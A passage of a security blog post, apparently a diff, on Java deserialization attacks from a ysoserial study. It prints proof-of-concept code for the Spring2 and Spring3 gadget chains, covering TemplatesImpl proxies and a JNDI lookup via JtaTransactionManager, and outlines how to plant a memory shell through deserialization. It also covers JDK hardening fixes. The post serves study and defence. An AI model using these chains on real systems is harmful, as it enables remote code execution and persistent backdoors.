class="hljs-keyword">catch</span> (InvocationTargetException var6) &#123;  <br>            <span class="hljs-keyword">throw</span> var6.getTargetException();  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>The invocation will be delegated to the object returned by <code>objectFactory</code>. We can create an <code>ObjectFactory</code> proxy and hook <code>getObject()</code> method for returning <code>TemplatesImpl</code>.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">ObjectFactory</span> <span class="hljs-variable">objectFactoryProxy</span> <span class="hljs-operator">=</span>  <br>      Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="hljs-string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);<br></code></pre></td></tr></table></figure>
+<p>Equip <code>ObjectFactoryDelegatingInvocationHandler</code> with this <code>ObjectFactory</code> and create a <code>Type</code> proxy:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplatesProxy</span> <span class="hljs-operator">=</span> Gadgets.createProxy((InvocationHandler)  <br>      Reflections.getFirstCtor(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)  <br>         .newInstance(objectFactoryProxy), Type.class, Templates.class);<br></code></pre></td></tr></table></figure>
+
+<p>Build <code>TypeProvider</code> proxy to hook <code>getType()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Gadgets.createMemoitizedProxy(  <br>      Gadgets.createMap(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplatesProxy),  <br>      forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>Build <code>MethodInvokeTypeProvider</code> and modify <code>methodName</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Constructor</span> <span class="hljs-variable">mitpCtor</span> <span class="hljs-operator">=</span> Reflections.getFirstCtor(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">mitp</span> <span class="hljs-operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;&#125;), <span class="hljs-number">0</span>);  <br>Reflections.setFieldValue(mitp, <span class="hljs-string">&quot;methodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><span class="hljs-keyword">return</span> nitp;<br></code></pre></td></tr></table></figure>
+
+<p>Whole Poc:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">ObjectFactory</span> <span class="hljs-variable">objectFactoryProxy</span> <span class="hljs-operator">=</span>  <br>      Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="hljs-string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplatesProxy</span> <span class="hljs-operator">=</span> Gadgets.createProxy((InvocationHandler)  <br>      Reflections.getFirstCtor(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)  <br>         .newInstance(objectFactoryProxy), Type.class, Templates.class);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Gadgets.createMemoitizedProxy(  <br>      Gadgets.createMap(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplatesProxy),  <br>      forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Constructor</span> <span class="hljs-variable">mitpCtor</span> <span class="hljs-operator">=</span> Reflections.getFirstCtor(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">mitp</span> <span class="hljs-operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;&#125;), <span class="hljs-number">0</span>);  <br>Reflections.setFieldValue(mitp, <span class="hljs-string">&quot;methodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);  <br>  <br><span class="hljs-keyword">return</span> mitp;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Spring3"><a href="#Spring3" class="headerlink" title="Spring3"></a>Spring3</h3><blockquote>
+<p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.springframework:spring-tx:5.2.3.RELEASE<br>org.springframework:spring-context:5.2.3.RELEASE<br>javax.transaction:javax.transaction-api:1.2</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain</span><br>lookup:<span class="hljs-number">179</span>, JndiTemplate (org.springframework.jndi)<br>lookupUserTransaction:<span class="hljs-number">571</span>, JtaTransactionManager (org.springframework.transaction.jta)<br>initUserTransactionAndTransactionManager:<span class="hljs-number">448</span>, JtaTransactionManager (org.springframework.transaction.jta)<br>readObject:<span class="hljs-number">1206</span>, JtaTransactionManager (org.springframework.transaction.jta)<br></code></pre></td></tr></table></figure>
+
+<p><code>JtaTransactionManager</code> class will look up JNDI URL stored in <code>userTransactionName</code> when deserializing.<br>This vul is quite simple without needing to analyze.<br>Poc:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jndiURL</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br><span class="hljs-keyword">if</span> (command.toLowerCase().startsWith(<span class="hljs-string">&quot;jndi:&quot;</span>)) &#123;  <br>   jndiURL = command.substring(<span class="hljs-number">5</span>);  <br>&#125;  <br>  <br><span class="hljs-type">JtaTransactionManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JtaTransactionManager</span>();  <br>manager.setUserTransactionName(jndiURL);  <br><span class="hljs-keyword">return</span> manager;<br></code></pre></td></tr></table></figure>
+
+
+<hr>
+<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><h2 id="Insert-memory-shell-through-deserialization-vulnerability"><a href="#Insert-memory-shell-through-deserialization-vulnerability" class="headerlink" title="Insert memory shell through deserialization vulnerability"></a>Insert memory shell through deserialization vulnerability</h2><ol>
+<li>Create a memory shell class(e.g. <code>EvilFilter</code>) and override the required method</li>
+<li>Write code for inserting memory shell in a static code block of a certain class(normally the memory shell class itself)</li>
+<li>Select a script engine(JavaScript, BeanShell, Python, etc.). Prepare the script code in which define an evil class to insert memory shell and create a new instance to trigger the static code block</li>
+<li>Execute script through deserialization vulnerability.</li>
+</ol>
+<hr>
+<h2 id="Fixes"><a href="#Fixes" class="headerlink" title="Fixes"></a>Fixes</h2><h3 id="JDK-fixes"><a href="#JDK-fixes" class="headerlink" title="JDK fixes"></a>JDK fixes</h3><h4 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h4><p>This article<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Paper/浅谈Java反序列化漏洞修复方案.md at master · Cryin/Paper](https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md)">[1]</span></a></sup> introduces security updates for serialization in JDK1.8. In summary, there are three strengthening methods introduced in JDK1.8:</p>
+<ol>
+<li>Override <code>ObjectInputStream</code>‘s <code>resolveClass</code> or <code>resolveProxyClass</code> method</li>
+<li>Use <code>ValidatingObjectInputStream</code> to decorate <code>ObjectInputStream</code> to deploy white-list validation</li>
+<li>Create an <code>ObjectInputFilter</code> class overriding <code>checkInput</code> method, and decorate an <code>ObjectInputStream</code> via <code>setObjectInputFilter</code> method.</li>
+</ol>
+<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a><code>AnnotationInvocationHandler</code></h4><p>Recall [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections1|the exploitation of CC1]], there are two handlers employed, one with a dynamic proxy as <code>memberValues</code>(i.e. outer handler) and another which is a member of the proxy object with a <code>LazyMap</code> as <code>memberValues</code>(i.e. inner handler). While deserialize, it comes in a depth-prior recursion, so the inner handler would be firstly deserialized, after all fields finish deserialization here comes to deserializing the proxy, later the outer handler.<br>Let’s take a look at the <code>AnnotationInvocationHandler</code>‘s <code>readObject</code> in JDK1.8:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  <br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> s.readFields();  <br>  <br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; t = (Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt;)fields.get(<span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-literal">null</span>);  <br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-literal">null</span>);  <br>  <br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly  </span><br>  <br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        annotationType = AnnotationType.getInstance(t);  <br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;  <br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out  </span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);  <br>    &#125;  <br>  <br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();  <br>    <span class="hljs-comment">// consistent with runtime Map type  </span><br>    Map&lt;String, Object&gt; mv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();  <br>  <br>    <span class="hljs-comment">// If there are annotation members without values, that  </span><br>    <span class="hljs-comment">// situation is handled by the invoke method.    for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  </span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>        Class&lt;?&gt; memberType = memberTypes.get(name);  <br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists  </span><br>            value = memberValue.getValue();  <br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||  <br>                  value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;  <br>                value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(  <br>                            objectToString(value))  <br>                    .setMember(annotationType.members().get(name));  <br>            &#125;  <br>        &#125;  <br>        mv.put(name, value);  <br>    &#125;  <br>  <br>    UnsafeAccessor.setType(<span class="hljs-built_in">this</span>, t);  <br>    UnsafeAccessor.setMemberValues(<span class="hljs-built_in">this</span>, mv);  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>The key action falls in the local variable <code>mv</code>, now <code>readObject</code> will always set the <code>memberValue</code> to <code>LinkedHashMap</code> whatever its type deserialized. So the <code>LazyMap</code> in our CC1 would not be effective.</p>
+<hr>
+<h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><hr>
+<h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><h3 id="How-to-test-Poc-Do-not-debug"><a href="#How-to-test-Poc-Do-not-debug" class="headerlink" title="How to test Poc? Do not debug!"></a>How to test Poc? Do not debug!</h3><p>IDEA debugger could ignite the key RCE code point, which will lead to confusion like: why does calculator start even before reaching the RCE code? The picture below is an proof that the debugger would call functions of current objects.<br>![[Pasted image 20231008160842.png]]</p>
+<hr>
+<h2 id="Journal"><a href="#Journal" class="headerlink" title="Journal"></a>Journal</h2><ul>
+<li><input checked="" disabled="" type="checkbox"> CC8 not worked</li>
+</ul>
+<hr>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><section class="footnotes"><h2>Reference</h2><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a target="_blank" rel="noopener" href="https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md">Paper&#x2F;浅谈Java反序列化漏洞修复方案.md at master · Cryin&#x2F;Paper</a>
+<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pentest/" class="category-chain-item">Pentest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java Deserialize Vulnerabilities, ysoserial study</div>
+      <div>http://padishah.github.io/2023/10/1726c701d497.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Padishah</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 24, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/ac9c8c888b5f.html" title="Memshell study, JNDI inject memshell, JNDI exploit tool development">
+                        <span class="hidden-mobile">Memshell study, JNDI inject memshell, JNDI exploit tool development</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
